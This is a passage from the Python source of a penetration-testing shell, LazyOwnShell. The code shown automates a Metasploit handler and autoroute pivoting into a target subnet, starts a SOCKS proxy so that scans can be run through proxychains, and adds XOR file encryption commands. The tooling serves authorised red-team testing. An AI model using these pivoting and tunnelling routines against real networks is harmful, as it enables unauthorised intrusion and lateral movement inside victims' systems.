            rc_file_path = "/tmp/autoroute.rc"

            with open(rc_file_path, "w") as file:
                file.write(f"""
            use exploit/multi/handler
            set payload {setpayload}
            set LHOST {lhost}
            set LPORT {lport}
            exploit -j -z

            # After getting a session
            sessions -i {session_id}
            run post/multi/manage/autoroute RHOST={target_subnet} NETMASK={netmask}

            # Exit the Metasploit console
            exit
            """)

            # Step 2: Start Metasploit with the Resource Script
            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

            # Step 3: Set up the Metasploit SOCKS Proxy
            subprocess.run(
                [
                    "msfconsole",
                    "-q",
                    "-x",
                    "use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j",
                ],
                check=True,
            )

            # Step 4: Configure Proxychains to Use the SOCKS Proxy
            # proxychains_conf_path = '/etc/proxychains.conf'
            # with open(proxychains_conf_path, 'a') as file:
            #    file.write("\nsocks4 127.0.0.1 1080")

            # Notify the user
            print_msg(
                "Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080"
            )
            print_msg(
                "You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>"
            )

            # Cleanup
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)

    def do_encrypt(self, line):
        """
        Encrypts a file using XOR encryption.

        1. Splits the provided `line` into `file_path` and `key` arguments.
        2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
        3. Reads the file specified by `file_path`.
        4. Encrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
        5. Writes the encrypted data to a new file with the ".enc" extension added to the original file name.
        6. Prints a message indicating the file has been encrypted.
        7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

        :param line: A string containing the file path and the key separated by a space.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            encrypt <file_path> <key>
        Replace `<file_path>` with the path to the file to be encrypted and `<key>` with the encryption key.
        """

        args = shlex.split(line)
        if len(args) != 2:
            print_error("Usage: encrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted_data)
            print_msg(f"File encrypted: {file_path}.enc")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    def do_decrypt(self, line):
        """
        Decrypts a file using XOR encryption.

        1. Splits the provided `line` into `file_path` and `key` arguments.
        2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
        3. Reads the encrypted file specified by `file_path`.
        4. Decrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
        5. Writes the decrypted data to a new file by removing the ".enc" extension from the original file name.
        6. Prints a message indicating the file has been decrypted.
        7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

        :param line: A string containing the file path and the key separated by a space.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            decrypt <file_path> <key>
        Replace `<file_path>` with the path to the encrypted file and `<key>` with the decryption key.
        """

        args = shlex.split(line)
        if len(args) != 2:
            print_error("Usage: decrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path.replace(".enc", ""), "wb") as f:
                f.write(decrypted_data)
            print_msg(f"File decrypted: {file_path.replace('.enc', '')}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output


def xor_encrypt_decrypt(data, key):
    """XOR Encrypt or Decrypt data with a given key"""
    key_bytes = bytes(key, "utf-8")
    key_length = len(key_bytes)
    return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])


if __name__ == "__main__":
    p = LazyOwnShell()
    p.onecmd("p")
    p.onecmd("rhost")
    if arguments:
        if arg.startswith("-c"):
            cmd = arguments[1]
            os.system(
                'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
            )
            p.onecmd(cmd)
            p.cmdloop()

    if NOBANNER is False:
        print(
            f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
        )
        time.sleep(0.2)
    else:
        p.onecmd("rhost clean")    

    os.system(
        'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
    )

    p.cmdloop()
